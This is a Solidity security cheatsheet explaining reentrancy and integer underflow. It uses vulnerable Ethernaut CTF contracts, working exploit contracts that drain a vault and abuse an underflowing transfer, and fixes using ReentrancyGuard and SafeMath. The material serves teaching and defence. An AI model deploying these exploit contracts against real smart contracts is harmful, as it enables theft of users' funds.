# Common vulnerabilities in Ethereum and EVM based chains

Solidity cheatsheet is available in [solidity-cheatsheet](/README.md).

## Table of contents

- [Common vulnerabilities in Ethereum and EVM based chains](#common-vulnerabilities-in-ethereum-and-evm-based-chains)
  * [Table of contents](#table-of-contents)
  * [Motivation](#motivation)
  * [Reentrancy](#reentrancy)
    + [Examples](#reentrancy-example)
    + [How to prevent reentrancy attacks](#how-to-prevent-reentrancy-attacks)
  * [Arithmetic overflows and underflows](#arithmetic-overflows-and-underflows)
    + [Underflow example](#underflow-example)
    + [Overflow and underflow protection](#overflow-and-underflow-protection)

### Motivation

TBD

### Reentrancy

Computer scientists say that a procedure is re-entrant if its execution can be interrupted in the middle, initiated over (re-entered), and both runs can complete without any errors in execution. In the context of Ethereum smart contracts, re-entrancy can lead to serious vulnerabilities. 

The most famous example of this was the DAO Hack, where $70million worth of Ether was siphoned off.

### Reentrancy example
(example from [Ethernaut](https://ethernaut.openzeppelin.com))
```solidity
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result, bytes memory data) = msg.sender.call.value(_amount)("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  fallback() external payable {}
}
```

The above smart contract can be exploited using a simple reentrancy attack. Example below:
```solidity
pragma solidity ^0.6.0;

contract Exploiter {
    address private owner;
    address payable vault = <address of the exploited contract>;
    Reentrancy exploited = Reentrancy(<address of the exploited contract>);
    
    constructor() public payable{
        owner = msg.sender;
    }
    
    modifier onlyOwner {
        require(msg.sender == owner, "Only owner: operation not allowed");
        _;
    }
    
    function deposit() public onlyOwner {
        exploited.donate{value: 1 ether}(address(this));
    }
    
    function attack() public onlyOwner {
        exploited.withdraw(0.5 ether);
    }
    
    function selfkill() public onlyOwner {
        selfdestruct(payable(owner));
    }
    
    fallback() external payable {
        if ( vault.balance > 0 ){
            exploited.withdraw(0.5 ether);
        }
    }
}
```
### How to prevent Reentrancy attacks:

Use the [Openzeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts)'s ReentrancyGuard to block reentrant calls to your functions.

Example: (using the reentrancy guard for the vulnerable contract from above)

```solidity
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/security/ReentrancyGuard.sol';

contract Reentrance is ReentrancyGuard{
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public nonReentrant{
    if(balances[msg.sender] >= _amount) {
      (bool result, bytes memory data) = msg.sender.call.value(_amount)("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  fallback() external payable {}
}
```

Notice the inheritance `contract Reentrancy is ReentrancyGuard` and function definition `function withdraw(uint _amount) public nonReentrant`.

### Arithmetic overflows and underflows
Solidity’s 256 bits Virtual Machine (EVM) brought back overflow and underflow issues. Developers should be extra careful when using uint data types.
You can think of a uint/int data type as a ring buffer, when the limit is exceded, it will start again from the first element(i.e. zero).
Take a look at the following example:
- we have a `uint _var = 0` that means it can store any integer up to 2^256 - 1. Now let's say we want to do the following operation: 
    - `_var = _var + (2**256 - 1) + 5` will give as a value of 4 (because `0 + 2**256 - 1` will give us MAX value, but adding 5 over the max value will overflow the uint and give us 4)

### Underflow example
The following contract is taken from the [Ethernaut](https://ethernaut.openzeppelin.com) CTF, Token level:
```solidity
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

A simple exploit for this contract could be the following:
```solidity
pragma solidity ^0.6.0;

interface Token{
    function transfer(address _to, uint value) external ;
}

contract TokenHacker{
    address tokenAddress = 0x08EABfcd1a1931F3307908EeE726Aa2F4Fe1E3b0;
    Token token;
    
    constructor () public {
        token = Token(tokenAddress);
    }
    
    function hack() public {
        token.transfer(0xa447DB345C0b81aD25B83CFF30E08f6b9fdF6CA6, 50000);
    }
    
}
```

### Overflow and underflow protection
Use the [Openzeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts)'s SafeMath library to avoid underflows and overflows on your data types.

